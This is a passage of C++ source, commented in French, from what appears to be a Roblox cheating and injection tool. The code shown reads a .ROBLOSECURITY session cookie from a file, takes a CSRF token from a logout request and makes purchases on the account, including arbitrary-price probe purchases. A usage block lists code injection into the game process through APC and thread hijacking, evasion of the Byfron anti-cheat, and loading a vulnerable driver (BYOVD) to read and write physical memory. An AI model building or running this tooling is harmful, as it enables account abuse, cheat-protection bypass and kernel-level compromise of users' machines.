                                     proxy.empty() ? WINHTTP_NO_PROXY_NAME : wProxy.c_str(),
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { out.msg = "WinHttpOpen : " + std::to_string(GetLastError()); return out; }
    HINTERNET hConnect = nullptr, hRequest = nullptr;
    do {
        std::wstring whost = RbxUtf8ToWide(resolvedHost);
        std::wstring wpath = RbxUtf8ToWide(path);
        std::wstring wmethod = RbxUtf8ToWide(method);
        const bool isSandboxed = g_sandbox_mode.load(std::memory_order_relaxed);
        const INTERNET_PORT port = isSandboxed ? 8080 : INTERNET_DEFAULT_HTTPS_PORT;
        hConnect = WinHttpConnect(hSession, whost.c_str(), port, 0);
        if (!hConnect) { out.msg = "WinHttpConnect : " + std::to_string(GetLastError()); break; }
        hRequest = WinHttpOpenRequest(hConnect, wmethod.c_str(), wpath.c_str(), nullptr,
                                      WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                      isSandboxed ? 0 : WINHTTP_FLAG_SECURE);
        if (!hRequest) { out.msg = "WinHttpOpenRequest : " + std::to_string(GetLastError()); break; }
        WinHttpSetTimeouts(hRequest, timeoutMs, timeoutMs, timeoutMs, timeoutMs);

        std::wstring hdrs =
            L"Accept: application/json, text/plain, */*\r\n"
            L"Accept-Encoding: identity\r\n"
            L"Accept-Language: en-US,en;q=0.9\r\n"
            L"Content-Type: application/json\r\n"
            L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0\r\n";
        if (!cookie.empty()) hdrs += L"Cookie: .ROBLOSECURITY=" + RbxUtf8ToWide(cookie) + L"\r\n";
        if (!xsrf.empty())   hdrs += L"X-CSRF-TOKEN: " + RbxUtf8ToWide(xsrf) + L"\r\n";

        LPVOID bodyPtr = postBody.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)postBody.data();
        DWORD bodyLen  = (DWORD)postBody.size();
        if (!WinHttpSendRequest(hRequest, hdrs.c_str(), (DWORD)hdrs.size(), bodyPtr, bodyLen, bodyLen, 0)) {
            out.msg = "WinHttpSendRequest : " + std::to_string(GetLastError());
            break;
        }
        if (!WinHttpReceiveResponse(hRequest, nullptr)) {
            out.msg = "WinHttpReceiveResponse : " + std::to_string(GetLastError());
            break;
        }
        DWORD status = 0, slen = sizeof(status);
        if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                WINHTTP_HEADER_NAME_BY_INDEX, &status, &slen, WINHTTP_NO_HEADER_INDEX))
            out.status = status;

        DWORD clen = 0;
        if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CUSTOM, L"X-CSRF-Token",
                                 WINHTTP_NO_OUTPUT_BUFFER, &clen, WINHTTP_NO_HEADER_INDEX) && clen > 0) {
            std::wstring hbuf(clen, L'\0');
            if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CUSTOM, L"X-CSRF-Token",
                                    &hbuf[0], &clen, WINHTTP_NO_HEADER_INDEX) && clen > 0) {
                hbuf.resize(std::wcslen(hbuf.c_str()));  // clen est en OCTETS ; tronquer aux vrais caracteres
                out.xsrf = RbxWideToUtf8(hbuf);
            }
        }

        std::string body;
        DWORD avail = 0;
        while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
            std::string chunk(avail, '\0');
            DWORD read = 0;
            if (!WinHttpReadData(hRequest, &chunk[0], avail, &read) || read == 0) break;
            chunk.resize(read);
            body += chunk;
        }
        out.body = std::move(body);
        out.json = rbxjson::Parse(out.body);
        out.ok = true;
    } while (false);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return out;
}

static RbxHttpResult RbxGet(const char* host, const char* path, const std::string& cookie) {
    return RbxHttp("GET", host, path, cookie, "", "");
}
static RbxHttpResult RbxPost(const char* host, const char* path, const std::string& cookie,
                             const std::string& xsrf, const std::string& postBody) {
    return RbxHttp("POST", host, path, cookie, xsrf, postBody);
}

// --- Extraction d'info produit ----------------------------------------------
struct RbxProductInfo {
    bool ok = false;
    long long productId = 0;
    long long sellerId = 0;
    long long price = 0;
    std::string name;
    std::string msg;
};

static long long RbxJsonLong(const rbxjson::Value& j, const char* k, long long fb = 0) {
    const rbxjson::Value* v = j.find(k);
    return v ? v->asInt(fb) : fb;
}
static std::string RbxJsonStr(const rbxjson::Value& j, const char* k) {
    const rbxjson::Value* v = j.find(k);
    return v ? v->asStr() : std::string();
}
static long long RbxJsonCreatorId(const rbxjson::Value& j) {
    const rbxjson::Value* c = j.find("Creator");
    if (c && c->isObject()) {
        // CreatorTargetId = entite vendeuse (groupe OU utilisateur). Pour un
        // gamepass de groupe, Creator.Id est l'utilisateur representant et
        // NON le destinataire du Robux -> pas de InvalidArguments.
        if (const rbxjson::Value* id = c->find("CreatorTargetId")) return id->asInt();
        if (const rbxjson::Value* id = c->find("Id")) return id->asInt();
        if (const rbxjson::Value* id = c->find("UserId")) return id->asInt();
    }
    return 0;
}

static RbxProductInfo RbxGamepassInfo(const std::string& cookie, long long id) {
    RbxProductInfo info;
    std::string path = "/game-passes/v1/game-passes/" + std::to_string(id) + "/product-info";
    RbxHttpResult r = RbxGet("apis.roblox.com", path.c_str(), cookie);
    if (!r.ok) { info.msg = r.msg; return info; }
    if (r.status != 200) { info.msg = "HTTP " + std::to_string(r.status) + " : " + r.body; return info; }
    info.productId = RbxJsonLong(r.json, "ProductId");
    if (info.productId == 0) { info.msg = "ProductId introuvable : " + r.body; return info; }
    info.sellerId = RbxJsonCreatorId(r.json);
    info.price    = info.price ? info.price : RbxJsonLong(r.json, "PriceInRobux");
    info.name     = RbxJsonStr(r.json, "Name");
    info.ok = true;
    return info;
}

static RbxProductInfo RbxMarketplaceInfo(const std::string& cookie, long long id) {
    RbxProductInfo info;
    std::string path = "/v2/assets/" + std::to_string(id) + "/details";
    RbxHttpResult r = RbxGet("economy.roblox.com", path.c_str(), cookie);
    if (!r.ok) { info.msg = r.msg; return info; }
    if (r.status != 200) { info.msg = "HTTP " + std::to_string(r.status) + " : " + r.body; return info; }
    info.productId = RbxJsonLong(r.json, "ProductId");
    if (info.productId == 0) { info.msg = "ProductId introuvable : " + r.body; return info; }
    info.sellerId = RbxJsonCreatorId(r.json);
    info.price    = RbxJsonLong(r.json, "PriceInRobux");
    if (info.price == 0) info.price = RbxJsonLong(r.json, "Price");
    info.name = RbxJsonStr(r.json, "Name");
    info.ok = true;
    return info;
}

static RbxProductInfo RbxDevProductInfo(const std::string& cookie, long long id) {
    // Le DevProduct id fourni EST le ProductId de l'economy Roblox.
    RbxProductInfo info;
    std::string path1 = "/marketplace-service/v1/products/" + std::to_string(id) + "/details";
    RbxHttpResult r = RbxGet("apis.roblox.com", path1.c_str(), cookie);
    if (!r.ok) { info.msg = r.msg; return info; }
    if (r.status != 200) {
        // Fallback : vue multi-produits
        std::string path2 = "/marketplace-service/v1/products/details?productId=" + std::to_string(id);
        RbxHttpResult r2 = RbxGet("apis.roblox.com", path2.c_str(), cookie);
        if (r2.ok && r2.status == 200) r = r2;
        else { info.msg = "HTTP " + std::to_string(r.status) + " : " + r.body; return info; }
    }
    info.productId = RbxJsonLong(r.json, "ProductId");
    if (info.productId == 0) info.productId = RbxJsonLong(r.json, "id");
    if (info.productId == 0) { info.msg = "ProductId introuvable : " + r.body; return info; }
    info.sellerId = RbxJsonCreatorId(r.json);
    if (info.sellerId == 0) info.sellerId = RbxJsonLong(r.json, "sellerId");
    if (info.sellerId == 0) info.sellerId = RbxJsonLong(r.json, "creatorId");
    info.price = RbxJsonLong(r.json, "priceInRobux");
    if (info.price == 0) info.price = RbxJsonLong(r.json, "PriceInRobux");
    info.name = RbxJsonStr(r.json, "name");
    if (info.name.empty()) info.name = RbxJsonStr(r.json, "Name");
    info.ok = true;
    return info;
}

// --- Ordonnanceur achat ------------------------------------------------------
static int RunBuyProbe(const std::vector<const char*>& positional) {
    // Usage : aob.exe --buy-probe <productId> <price> <sellerId>
    // Envoie le POST economy.roblox.com/v1/purchases/products/<productId>
    // avec le body canonique, pour tester des cibles arbitraires.
    if (positional.size() < 2) {
        std::cerr << "Usage : aob.exe --buy-probe <productId> <price> [<sellerId>]\n  (sans sellerId, le body est {expectedCurrency, expectedPrice})\n";
        return 1;
    }
    auto parseNum = [](const char* s) -> long long {
        return std::strtoll(s, nullptr, 10);
    };
    long long productId = parseNum(positional[0]);
    long long price    = parseNum(positional[1]);
    long long sellerId = positional.size() >= 3 ? parseNum(positional[2]) : 0;

    std::string cookie;
    if (!RbxReadCookie(cookie)) {
        std::cerr << "Erreur : impossible de lire cookie.txt.\n";
        return 1;
    }

    RbxHttpResult xsrf = RbxPost("auth.roblox.com", "/v2/logout", cookie, "", "");
    if (xsrf.xsrf.empty()) {
        std::cerr << "Impossible d'obtenir X-CSRF-TOKEN (HTTP " << xsrf.status << ").\n";
        return 3;
    }

    std::string body;
    if (sellerId != 0) {
        body = "{\"expectedCurrency\":1,\"expectedPrice\":" + std::to_string(price)
             + ",\"expectedSellerId\":" + std::to_string(sellerId) + "}";
    } else {
        body = "{\"expectedCurrency\":1,\"expectedPrice\":" + std::to_string(price) + "}";
    }
    std::string buyPath = "/v1/purchases/products/" + std::to_string(productId);
    std::cout << "POST " << buyPath << "\n  body=" << body << "\n";
    RbxHttpResult buy = RbxPost("economy.roblox.com", buyPath.c_str(), cookie, xsrf.xsrf, body);
    std::cout << "HTTP " << buy.status << "\n" << buy.body << "\n";
    return 0;
}

static int RunWebPurchase(const char* kind, const std::vector<const char*>& positional) {
    if (positional.empty()) {
        std::cerr << "Usage : aob.exe --buy-" << kind << " <id>\n"
                  << "  Le cookie .ROBLOSECURITY est lu depuis cookie.txt dans le repertoire courant.\n";
        return 1;
    }
    const std::string idStr(positional[0]);
    if (idStr.empty() || !std::all_of(idStr.begin(), idStr.end(),
                                      [](char c) { return c >= '0' && c <= '9'; })) {
        std::cerr << "ID invalide : " << positional[0] << '\n';
        return 1;
    }
    long long id = std::strtoll(idStr.c_str(), nullptr, 10);

    std::string cookie;
    if (!RbxReadCookie(cookie)) {
        std::cerr << "Erreur : impossible de lire cookie.txt (fichier absent ou vide) dans le repertoire courant.\n";
        return 1;
    }
    std::cout << "Cookie .ROBLOSECURITY lu depuis cookie.txt.\n";

    RbxHttpResult auth = RbxGet("users.roblox.com", "/v1/users/authenticated", cookie);
    if (!auth.ok) { std::cerr << "Echec users.roblox.com : " << auth.msg << '\n'; return 3; }
    long long userId = RbxJsonLong(auth.json, "id");
    if (userId == 0) {
        std::cerr << "Cookie invalide ou expire (HTTP " << auth.status << ").\n";
        return 3;
    }
    std::cout << "Compte : " << RbxJsonStr(auth.json, "name")
              << " (id " << userId << ")\n";

    RbxHttpResult xsrf = RbxPost("auth.roblox.com", "/v2/logout", cookie, "", "");
    if (xsrf.xsrf.empty()) {
        std::cerr << "Impossible d'obtenir X-CSRF-TOKEN (HTTP " << xsrf.status << ").\n";
        return 3;
    }
    std::cout << "Token X-CSRF-TOKEN obtenu.\n";

    std::string curPath = "/v1/users/" + std::to_string(userId) + "/currency";
    RbxHttpResult cur = RbxGet("economy.roblox.com", curPath.c_str(), cookie);
    long long balance = -1;
    if (cur.ok && cur.status == 200) {
        balance = RbxJsonLong(cur.json, "robux", -1);
        if (balance >= 0) std::cout << "Solde R$ : " << balance << "\n";
    }

    std::string kindName;
    RbxProductInfo info;
    if (std::strcmp(kind, "gamepass") == 0) {
        info = RbxGamepassInfo(cookie, id);
        kindName = "Gamepass";
    } else if (std::strcmp(kind, "devproduct") == 0) {
        info = RbxDevProductInfo(cookie, id);
        kindName = "DevProduct";
    } else {
        info = RbxMarketplaceInfo(cookie, id);
        kindName = "Marketplace (asset)";
    }
    if (!info.ok) {
        std::cerr << "Info produit : " << kindName << " " << id << " -> " << info.msg << '\n';
        return 4;
    }
    std::cout << "Produit " << kindName << " " << id << " : \"" << info.name
              << "\" a " << info.price << " R$ (vendeur " << info.sellerId
              << ", productId " << info.productId << ")\n";

    std::string body = "{\"expectedCurrency\":1,\"expectedPrice\":" + std::to_string(info.price)
                     + ",\"expectedSellerId\":" + std::to_string(info.sellerId) + "}";
    std::cout << "Achat en cours...\n";
    std::string buyPath = "/v1/purchases/products/" + std::to_string(info.productId);
    RbxHttpResult buy = RbxPost("economy.roblox.com", buyPath.c_str(), cookie, xsrf.xsrf, body);
    std::cout << "HTTP " << buy.status << "\n" << buy.body << "\n";
    if (!buy.ok || buy.status != 200) {
        std::cerr << "=> Achat echoue";
        if (!buy.msg.empty()) std::cerr << " (" << buy.msg << ")";
        std::cerr << '\n';
        return 5;
    }

    bool purchased = false;
    const rbxjson::Value* p1 = buy.json.find("purchased");
    const rbxjson::Value* p2 = buy.json.find("isPurchased");
    if (p1 && p1->t == rbxjson::Value::T::Bool) purchased = p1->boolean;
    else if (p2 && p2->t == rbxjson::Value::T::Bool) purchased = p2->boolean;
    else {
        const rbxjson::Value* st = buy.json.find("status");
        if (st && st->t == rbxjson::Value::T::Number && st->asInt() == 1) purchased = true;
    }
    std::string msg = RbxJsonStr(buy.json, "statusMessage");
    std::cout << "=> Achat " << (purchased ? "REUSSI" : "REFUSE") << "\n";
    if (!msg.empty()) std::cout << "   " << msg << "\n";

    RbxHttpResult cur2 = RbxGet("economy.roblox.com", curPath.c_str(), cookie);
    if (cur2.ok && cur2.status == 200 && balance >= 0) {
        long long after = RbxJsonLong(cur2.json, "robux", -1);
        if (after >= 0) std::cout << "Solde R$ apres achat : " << after
                                  << " (delta " << (after - balance) << ")\n";
    }
    return purchased ? 0 : 6;
}

#endif // _WIN32

// ===========================================================================
// Client Simulator (C:\client_simulator) — requêtes HTTP e-commerce réalistes
// via la bibliothèque statique client_simulator.lib (libcurl).
//   MonNouvelApp.exe --sim-get <url>
//   MonNouvelApp.exe --sim-post <url> <json>
//   MonNouvelApp.exe --sim-put  <url> <json>
//   MonNouvelApp.exe --sim-del  <url>
//   MonNouvelApp.exe --sim-purchase <baseUrl>
//   MonNouvelApp.exe --mock [analyze|capture|configure|deploy|all]
//   MonNouvelApp.exe --mock-log <session.log> --mock-product <id> ... --mock-proxy-dir <dir>
// ===========================================================================
#ifdef _WIN32
int RunSimulatorDemo(const char* mode, const std::vector<const char*>& positional) {
    using namespace ecommerce_sim;
    if (positional.empty()) {
        std::cerr << "Usage :\n"
                  << "  MonNouvelApp.exe --sim-get <url>\n"
                  << "  MonNouvelApp.exe --sim-post <url> <json>\n"
                  << "  MonNouvelApp.exe --sim-put  <url> <json>\n"
                  << "  MonNouvelApp.exe --sim-del  <url>\n"
                  << "  MonNouvelApp.exe --sim-purchase <baseUrl>\n"
                  << "  MonNouvelApp.exe --mock [analyze|capture|configure|deploy|all]\n"
                  << "  MonNouvelApp.exe --mock-log <session.log> --mock-proxy-dir <proxydir>\n";
        return 1;
    }

    RequestConfig cfg;
    cfg.base_url = resolve_endpoint(positional[0]);
    cfg.session_token =
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.sim";
    cfg.accept_language = "en-US,en;q=0.9,fr;q=0.8";

    RateLimitConfig rl;
    rl.min_delay_ms = 150.0;
    rl.max_delay_ms = 500.0;
    rl.burst_limit  = 20;
    rl.burst_window_seconds = 30.0;
    rl.jitter_factor = 0.1;

    try {
        ClientSimulator sim(cfg);
        sim.set_rate_limit_config(rl);

        // Transparent Proxy Interception : le moteur libcurl vérifie
        // `proxy_url_` AVANT chaque curl_easy_perform et pose
        // CURLOPT_PROXY (client_simulator.cpp). On alimente ce slot depuis
        // g_proxy_url si --proxy a été fourni (accès mutex-guardé).
        const std::string proxy = GetProxyUrl();
        if (!proxy.empty()) sim.set_proxy(proxy);

        if (std::strcmp(mode, "get") == 0) {
            Response r = sim.get("");
            std::cout << "== GET " << cfg.base_url << " ==\n"
                      << "HTTP " << r.status_code << " | "
                      << std::fixed << std::setprecision(1) << (r.total_time * 1000.0)
                      << " ms | OK=" << (r.success ? "true" : "false") << "\n";
            std::cout.unsetf(std::ios::fixed);
            if (!r.body.empty() && r.body.size() < 1000)
                std::cout << "Body: " << r.body.substr(0, 400) << "\n";
        } else if (std::strcmp(mode, "post") == 0 || std::strcmp(mode, "put") == 0) {
            if (positional.size() < 2) {
                std::cerr << "Corps JSON manquant : --sim-" << mode << " <url> <json>\n";
                return 1;
            }
            const std::string body = positional[1];
            const bool isPost = std::strcmp(mode, "post") == 0;
            Response r = isPost ? sim.post("", body) : sim.put("", body);
            std::cout << "== " << (isPost ? "POST " : "PUT ") << cfg.base_url << " ==\n"
                      << "HTTP " << r.status_code << " | "
                      << std::fixed << std::setprecision(1) << (r.total_time * 1000.0)
                      << " ms | OK=" << (r.success ? "true" : "false") << "\n";
            std::cout.unsetf(std::ios::fixed);
            if (r.success && !r.body.empty() && r.body.size() < 1000)
                std::cout << "Body: " << r.body.substr(0, 400) << "\n";
        } else if (std::strcmp(mode, "del") == 0) {
            Response r = sim.del("");
            std::cout << "== DELETE " << cfg.base_url << " ==\n"
                      << "HTTP " << r.status_code << " | "
                      << std::fixed << std::setprecision(1) << (r.total_time * 1000.0)
                      << " ms | OK=" << (r.success ? "true" : "false") << "\n";
            std::cout.unsetf(std::ios::fixed);
            if (r.success && !r.body.empty() && r.body.size() < 1000)
                std::cout << "Body: " << r.body.substr(0, 400) << "\n";
        } else if (std::strcmp(mode, "purchase") == 0) {
            PurchaseRequest purchase;
            purchase.items = {
                {"SKU-78421", 2, "XL", {{"color", "Midnight Blue"}}},
                {"SKU-19283", 1, "standard", {}},
            };
            purchase.shipping = {"Jean Dupont", "123 Avenue", "Apt 4B", "Paris",
                                 "Ile-de-France", "75008", "FR", "+33612345678"};
            purchase.payment  = {"card", "tok_visa", "4242", "12", "2027"};
            purchase.currency = "EUR";
            purchase.metadata = {{"session_source", "MonNouvelApp"},
                                 {"test_id", "SIM-2026-001"}};
            Response r = sim.execute_purchase_flow(purchase);
            std::cout << "== POST " << cfg.base_url << "/api/v1/checkout/purchase ==\n"
                      << "HTTP " << r.status_code << " | "
                      << std::fixed << std::setprecision(1) << (r.total_time * 1000.0)
                      << " ms | OK=" << (r.success ? "true" : "false") << "\n";
            std::cout.unsetf(std::ios::fixed);
            if (!r.body.empty() && r.body.size() < 1000)
                std::cout << "Body: " << r.body.substr(0, 400) << "\n";
            std::cout << "== Statistiques ==\n"
                      << "  Temps moyen de reponse : "
                      << std::fixed << std::setprecision(1)
                      << sim.get_average_response_time() * 1000.0 << " ms\n"
                      << "  Taux d'erreur          : " << sim.get_error_rate() * 100.0 << " %\n";
            std::cout.unsetf(std::ios::fixed);
        } else {
            std::cerr << "Mode --sim inconnu : " << mode << '\n';
            return 1;
        }
    } catch (const std::exception& e) {
        std::cerr << "Erreur ClientSimulator : " << e.what() << '\n';
        return 1;
    }
    return 0;
}
#endif // _WIN32

// Usage :
//   aob.exe                          -> PID 31280, signature par défaut, PROCESS_ALL_ACCESS
//   aob.exe <pid> "48 89 5C 24 ?? 50"
//   aob.exe <nom.exe> "48 89 ..."    -> PID résolu par nom (".exe" facultatif)
//   aob.exe --read-only [cible] [sig] -> PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
//   aob.exe --demo                   -> démo scan sur un buffer local
//   aob.exe --hook-demo              -> démo hook inline + trampoline (local)
//   aob.exe --iat-demo               -> démo hook IAT (local)
//   aob.exe --vmt-demo               -> démo hook VMT (redirection de pointeur,
//                                        AUCUN patch .text — feature 4)
//   aob.exe --luau-vm <pid|exe> ["<snippet lua>"] [0xluauLoad] [0xluaPcall] [0xluaState]
//   aob.exe --luau-vm <pid> ... --loadstring   -> installe la trampoline heap
//                                                (loadstring, AUCUN patch .text)
//   aob.exe --survivor <pid|exe> [secondes] ["<snippet lua>"]
//                                                -> stub heap taggé Byfron, anti-cheat
//   aob.exe --apc <pid|exe> ["<snippet lua>"] [0xluauLoad] [0xluaPcall] [0xluaState]
//                                                -> livraison par APC (threads existants,
//                                                   pas de CreateRemoteThread)
//   aob.exe --hijack <pid|exe> ["<snippet lua>"] [0xluauLoad] [0xluaPcall] [0xluaState]
//                                                -> livraison par thread hijacking
//                                                  (suspend + Rip -> stub + restore)
//   aob.exe --marketplace <pid|exe> [0xluauLoad] [0xluaPcall] [0xluaState]
//                                                -> execute le snippet MarketplaceService
//                                                  (PromptProductPurchase legacy + nouveau flux)
//   aob.exe --gamepass <pid|exe> [0xluauLoad] [0xluaPcall] [0xluaState]
//                                                -> execute le snippet Gamepass
//                                                  (PromptGamePassPurchase legacy + nouveau flux)
//   aob.exe --devproduct <pid|exe> [0xluauLoad] [0xluaPcall] [0xluaState]
//                                                -> execute le snippet DevProduct
//                                                  (GetProductInfo + PromptProductPurchase legacy)
//   aob.exe --detect <pid|exe> [0xluauLoad] [0xluaPcall] [0xluaState]
//                                                -> execute le snippet Detect
//                                                  (possession gamepass / inventaire / remote)
//   aob.exe --sig-update <pid|exe>              -> MISE A JOUR AUTOMATIQUE des signatures
//                                                  luau_load (scan famille + callers -> luau_sigs.txt)
//   aob.exe --autofix <pid|exe>                 -> RESOLUTION PAR EXECUTION : sonde chaque candidat
//                                                  luau_load et garde le premier qui exécute OK
//                                                  (risque : crash du jeu si mauvais candidat)
//   aob.exe --probe-thread <pid|exe>            -> DIAGNOSTIC livraison : le CreateRemoteThread +
//                                                  l'execution du stub marchent-ils dans la cible ?
//   aob.exe --probe-hijack <pid|exe>            -> DIAGNOSTIC hijack : le detournement d'un thread
//                                                  existant (SetThreadContext) s'execute-t-il ?
//   aob.exe --buy-gamepass <id>                 -> ACHAT WEB : gamepass (cookie.txt requis)
//   aob.exe --buy-devproduct <id>               -> ACHAT WEB : devproduct (cookie.txt requis)
//   aob.exe --buy-marketplace <id>              -> ACHAT WEB : asset marketplace (cookie.txt requis)
//   aob.exe --buy-probe <productId> <price> <sellerId>  -> ACHAT DIRECT : teste un achat arbitraire
//   aob.exe --siv-load [chemin SIVX64.sys]   -> BYOVD-SIV : charge le driver SIVX64 (elevated)
//   aob.exe --siv-remove                     -> BYOVD-SIV : arrete et supprime le service SIVX64
//   aob.exe --siv-read <physAddrHex> <len>   -> BYOVD-SIV : lecture memoire PHYSIQUE (elevated)
//   aob.exe --siv-write <physAddrHex> <hex>  -> BYOVD-SIV : ecriture memoire PHYSIQUE (elevated)
//   aob.exe --byovd-siv                      -> BYOVD-SIV : demo (charge + lecture de controle)
//   aob.exe --snyper-record [titre]        -> SNYPER : enregistre les clics (F9=point, F10=sauver)
//   aob.exe --snyper-play [titre] [--loop] -> SNYPER : rejoue script.txt (F12=stop, TAB=pause)
//   aob.exe --snyper-dryrun [titre]        -> SNYPER : rejoue SANS cliquer (validation par point)
//                                                (--pid <n> pour cibler un PID precis)
//   MonNouvelApp.exe --sim-get <url>       -> CLIENT SIMULATOR (libcurl) : GET e-commerce
//   MonNouvelApp.exe --sim-post <url> <json>   -> POST avec corps JSON
//   MonNouvelApp.exe --sim-put  <url> <json>   -> PUT avec corps JSON
//   MonNouvelApp.exe --sim-del  <url>      -> DELETE
//   MonNouvelApp.exe --sim-purchase <url>  -> flux d'achat complet (checkout/purchase)
// Les options peuvent être placées n'importe où.
//   aob.exe ... --sandbox (ou --test-mode) -> Network Mocking : toutes les URLs
//                                              HTTP sont redirigées vers localhost:8080
//                                              (voir resolve_endpoint()).
//   MonNouvelApp.exe ... --proxy <url>     -> PROXY TRANSPARENT : aiguille tout le
//                                              trafic HTTP sortant (WinHTTP Module 7
//                                              + libcurl Module 8) vers un proxy de
//                                              transit (Burp Suite / proxy Python).
// ---------------------------------------------------------------------------
// Mode --trace <exe> [args...] : lancement + espion du demarrage.
// Le processus est cree SUSPENDU (CREATE_SUSPENDED) : aucun code applicatif n'a
// encore tourne. On lit alors son PEB (RTL_USER_PROCESS_PARAMETERS : ligne de
// commande, repertoire courant, chemin DLL, environnement, titre fenetre) et les
// modules deja en place, puis on resume et on surveille ~N secondes :
//   - DLL chargees (EnumProcessModulesEx, diff)
//   - threads crees (Toolhelp)
//   - processus enfants (Toolhelp, arborescence parent->enfant)
//   - handles ouverts fichiers/registre (NtQuerySystemInformation(64)+NtQueryObject)
//   - connexions TCP/UDP (iphlpapi, filtrage par PID proprietaire)
// Options : --trace-timeout <s> (fenetre, defaut 5), --trace-keep (ne pas tuer).
// Variante : --trace-attach <pid> surveille un processus deja lance (diff
//            modules/threads/processus/fichiers/clefs/reseau + modules noyau).
// ---------------------------------------------------------------------------
#ifdef _WIN32

typedef LONG  MR_NTSTATUS;
#define MR_NT_SUCCESS(s) ((s) >= 0)
#define MR_STATUS_INFO_LENGTH_MISMATCH ((MR_NTSTATUS)0xC0000004L)
#define MR_STATUS_ACCESS_DENIED ((MR_NTSTATUS)0xC0000022L)

struct MrUnicodeString {
    USHORT      Length;
    USHORT      MaximumLength;
    uintptr_t   Buffer;
};

struct MrCurDir {
    MrUnicodeString DosPath;
    uintptr_t       Handle;
};

struct MrDriveLetterCurDir {
    USHORT      Flags;
    USHORT      Length;
    ULONG       TimeStamp;
    MrUnicodeString DosPath;
};

struct MrProcParams {
    ULONG       MaximumLength, Length, Flags, DebugFlags;
    uintptr_t   ConsoleHandle;
    ULONG       ConsoleFlags;
    uintptr_t   StandardInput, StandardOutput, StandardError;
    MrCurDir    CurrentDirectory;
    MrUnicodeString DllPath, ImagePathName, CommandLine;
    uintptr_t   Environment;
    ULONG       StartingPositionX, StartingPositionY;
    ULONG       CountX, CountY, CountCharsX, CountCharsY, FillAttribute;
    ULONG       Flags2, ShowWindowFlags;
    MrUnicodeString WindowTitle, DesktopInfo, ShellInfo, RuntimeData;
    MrDriveLetterCurDir CurrentDirectories[32];
};

struct MrPebPart {
    uintptr_t   pad0[2];          // InheritedAddressSpace..Mutant
    uintptr_t   ImageBaseAddress; // +0x10
    uintptr_t   Ldr;              // +0x18
    uintptr_t   ProcessParameters;// +0x20
};

struct MrListEntry {
    uintptr_t Flink;
    uintptr_t Blink;
};

struct MrPebLdrData {
    ULONG       Length;
    BOOLEAN     Initialized;
    uintptr_t   SsHandle;
    MrListEntry InLoadOrderModuleList;
};

struct MrLdrEntry {
    MrListEntry InLoadOrderLinks;
    MrListEntry InMemoryOrderLinks;
    MrListEntry InInitializationOrderLinks;
    uintptr_t   DllBase;
    uintptr_t   EntryPoint;
    ULONG       SizeOfImage;
    ULONG       pad1;
    MrUnicodeString FullDllName;
    MrUnicodeString BaseDllName;
};

struct MR_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID       Object;
    ULONG_PTR   UniqueProcessId;
    ULONG_PTR   HandleValue;
    ULONG       GrantedAccess;
    USHORT      CreatorBackTraceIndex;
    USHORT      ObjectTypeIndex;
    ULONG       HandleAttributes;
    ULONG       Reserved;
};

struct MR_SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR   NumberOfHandles;
    ULONG_PTR   Reserved;
    MR_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
};

static MR_NTSTATUS (NTAPI *g_NtQSI)(ULONG, PVOID, ULONG, PULONG) = nullptr;
static MR_NTSTATUS (NTAPI *g_NtQueryObject)(HANDLE, ULONG, PVOID, ULONG, PULONG) = nullptr;

static std::wstring ReadRemoteUnicode(HANDLE proc, uintptr_t addr) {
    MrUnicodeString u;
    SIZE_T rd = 0;
    if (addr == 0) return {};
    if (!ReadProcessMemory(proc, (LPCVOID)addr, &u, sizeof(u), &rd) || rd != sizeof(u))
        return {};
    if (u.Buffer == 0 || u.Length == 0 || u.Length > 65535) return {};
    std::wstring out(u.Length / 2, L'\0');
    if (!ReadProcessMemory(proc, (LPCVOID)u.Buffer, out.data(), u.Length, &rd)) return {};
    return out;
}

static std::string W2U8(const std::wstring& in) {
    if (in.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, in.c_str(), (int)in.size(), nullptr, 0, nullptr, nullptr);
    if (n <= 0) return {};
    std::string out(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, in.c_str(), (int)in.size(), out.data(), n, nullptr, nullptr);
    return out;
}

static std::wstring A2W(const char* in) {
    if (!in || !*in) return {};
    int n = MultiByteToWideChar(CP_ACP, 0, in, -1, nullptr, 0);
    std::wstring out(n > 1 ? n - 1 : 0, L'\0');
    if (n > 1) MultiByteToWideChar(CP_ACP, 0, in, -1, out.data(), n);
    return out;
}

static std::wstring CmdQuote(const std::wstring& s) {
    if (s.find_first_of(L" \t") == std::wstring::npos) return s;
    std::wstring q = L"\"";
    for (wchar_t c : s) {
        if (c == L'"') q += L"\"\"";
        else q += c;
    }
    q += L"\"";
    return q;
}

static std::wstring ResolveExePath(const std::wstring& input) {
    wchar_t full[MAX_PATH] = {};
    bool hasExe = input.size() >= 4 && _wcsicmp(input.c_str() + input.size() - 4, L".exe") == 0;
    if (hasExe) {
        SearchPathW(nullptr, input.c_str(), nullptr, MAX_PATH, full, nullptr);
    } else {
        if (SearchPathW(nullptr, input.c_str(), L".exe", MAX_PATH, full, nullptr) == 0)
            SearchPathW(nullptr, input.c_str(), nullptr, MAX_PATH, full, nullptr);
    }
    if (full[0] == 0 && GetFullPathNameW(input.c_str(), MAX_PATH, full, nullptr) == 0) return {};
    return full;
}

static std::wstring NtToDosPath(const std::wstring& ntPath) {
    if (ntPath.rfind(L"\\Device\\", 0) != 0) return ntPath;
    for (wchar_t d = L'A'; d <= L'Z'; ++d) {
        wchar_t root[4] = {d, L':', L'\\', 0};
        wchar_t dev[300] = {};
        if (QueryDosDeviceW(root, dev, 300) == 0) continue;
